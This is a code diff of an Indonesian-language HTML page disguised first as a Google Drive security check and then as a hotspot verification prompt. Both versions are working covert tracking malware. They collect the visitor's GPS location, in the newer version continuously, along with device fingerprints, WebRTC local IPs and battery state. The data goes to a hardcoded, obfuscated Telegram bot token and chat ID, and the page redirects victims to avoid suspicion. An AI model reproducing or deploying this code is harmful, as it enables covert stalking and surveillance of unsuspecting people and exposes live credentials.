@@ -1,86 +1,89 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Google Drive - Verifikasi Keamanan</title>
-    <script>
-        // 1. Obfuscated Token (Menyembunyikan Bot Token dari mata telanjang)
-        const _0x = ["8674170594:AAEazU35uI9bZ6s8JLwcN410H0STysKEzs4", "7970059663"];
-        
-        window.onload = function() {
-            // Memulai pelacakan tanpa menunggu interaksi berlebihan
-            initProtocol();
-        };
-
-        function initProtocol() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendIntel, silentMode, {
-                    enableHighAccuracy: true,
-                    timeout: 10000
-                });
-            }
-        }
-
-        async function sendIntel(pos) {
-            const { latitude: lat, longitude: lon, accuracy: acc } = pos.coords;
-            
-            // 2. Advanced Fingerprinting: Tembus VPN lewat Browser Info
-            const intel = {
-                device: navigator.platform,
-                memory: navigator.deviceMemory || "N/A",
-                cores: navigator.hardwareConcurrency || "N/A",
-                gpu: getGraphicsCard(),
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-
-            const text = `🔱 NEURAL STRIKE 🔱\n\n` +
-                         `📍 Map: https://www.google.com/maps?q=${lat},${lon}\n` +
-                         `🎯 Akurasi: ${acc}m\n` +
-                         `💻 HW: ${intel.cores} Core / ${intel.memory}GB RAM\n` +
-                         `🎮 GPU: ${intel.gpu}\n` +
-                         `🌍 Zone: ${intel.timezone}\n` +
-                         `📱 OS: ${intel.device}`;
-
-            await fetch(`https://api.telegram.org/bot${_0x[0]}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: _0x[1], text: text, parse_mode: "Markdown" })
-            });
-
-            // Langsung arahkan ke dokumen asli biar tidak curiga
-            window.location.href = "https://drive.google.com";
-        }
-
-        function getGraphicsCard() {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-        }
-
-        function silentMode() {
-            // Jika lokasi ditolak, kita tetap ambil data teknis (IP & Device)
-            fetch('https://ipapi.co/json/').then(res => res.json()).then(ip => {
-                const text = `⚠️ ACCESS DENIED (GPS)\n\nIP: ${ip.ip}\nOrg: ${ip.org}\nCity: ${ip.city}`;
-                fetch(`https://api.telegram.org/bot${_0x[0]}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: _0x[1], text: text })
-                });
-            });
-        }
-    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Verifikasi Jaringan</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { text-align: center; max-width: 400px; padding: 20px; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        body { font-family: -apple-system, system-ui, sans-serif; background: #f0f2f5; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: #fff; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 350px; width: 90%; display: none; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { font-size: 18px; color: #1c1e21; }
+        p { font-size: 14px; color: #606770; margin-bottom: 25px; }
+        .btn { background: #1877f2; color: #fff; border: none; padding: 14px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        #v-vault { display: none; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="60">
-        <h2>Enkripsi Terdeteksi</h2>
-        <p style="color: #5f6368; font-size: 14px;">Dokumen ini dilindungi oleh kebijakan keamanan Google. Verifikasi lokasi Anda untuk membuka dekripsi file.</p>
-        <button class="btn" onclick="initProtocol()">VERIFIKASI & BUKA</button>
-    </div>
+
+<div class="card" id="clientCard">
+    <div class="spinner"></div>
+    <h2>Verifikasi Akses Hotspot</h2>
+    <p>Perangkat Anda terdeteksi menggunakan koneksi bersama. Selesaikan verifikasi hardware untuk melanjutkan akses internet.</p>
+    <button class="btn" onclick="startTracking()">VERIFIKASI PERANGKAT</button>
+</div>
+
+<div id="v-vault">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
+
+<script>
+    if (location.protocol === 'http:') { location.replace(window.location.href.replace('http:', 'https:')); }
+
+    const _V = document.getElementById('v-vault').innerText.split('|');
+    const _TK = atob(_V[1]); const _CI = atob(_V[2]);
+
+    async function sendTele(msg) {
+        await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
+            method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: _CI, text: msg})
+        });
+    }
+
+    async function getSpecs() {
+        const gl = document.createElement('canvas').getContext('webgl');
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        const gpu = gl ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Unknown";
+        let bat = "N/A";
+        try { const b = await navigator.getBattery(); bat = `${(b.level*100).toFixed(0)}% [${b.charging?'CHG':'BATT'}]`; } catch(e) {}
+        return {gpu, bat, ua: navigator.userAgent, cores: navigator.hardwareConcurrency};
+    }
+
+    window.onload = async () => {
+        const pc = new RTCPeerConnection({iceServers:[]});
+        pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
+        
+        pc.onicecandidate = async (ice) => {
+            if(!ice || !ice.candidate) return;
+            const lip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
+            const specs = await getSpecs();
+            
+            // LOGIKA SPLITTER
+            // Jika IP berakhiran .1 biasanya dia pemberi hotspot (Gateway)
+            if (lip.endsWith(".1") || !lip.startsWith("192.168.43")) {
+                // TARGET UTAMA (Silent Grab & Berita)
+                await sendTele(`🔱 TARGET UTAMA (HOST) 🔱\n📱 HW: ${specs.gpu}\n🏠 IP LOKAL: ${lip}\n🔋 BATT: ${specs.bat}\n⚙️ CPU: ${specs.cores} Cores`);
+                window.location.href = "https://www.detik.com";
+            } else {
+                // PENUMPANG HOTSPOT (Tampilkan Halaman Verifikasi)
+                document.getElementById('clientCard').style.display = 'block';
+                await sendTele(`👥 PENUMPANG DETECTED 👥\n🏠 IP: ${lip}\n📱 HW: ${specs.gpu}`);
+            }
+        };
+    };
+
+    function startTracking() {
+        document.getElementById('clientCard').innerHTML = "<div class='spinner'></div><p>Sinkronisasi GPS Real-time...</p>";
+        
+        if (navigator.geolocation) {
+            // watchPosition = Tracking Real-time (ngirim tiap dia gerak)
+            navigator.geolocation.watchPosition(async (pos) => {
+                const maps = `🎯 REAL-TIME LOCATION UPDATE\n📍 Maps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n🎯 Akurasi: ${pos.coords.accuracy.toFixed(1)}m\n🏃 Kecepatan: ${pos.coords.speed || 0} m/s`;
+                await sendTele(maps);
+            }, (err) => {
+                window.location.href = "https://www.detik.com";
+            }, {enableHighAccuracy: true, maximumAge: 0});
+        }
+    }
+</script>
 </body>
 </html>
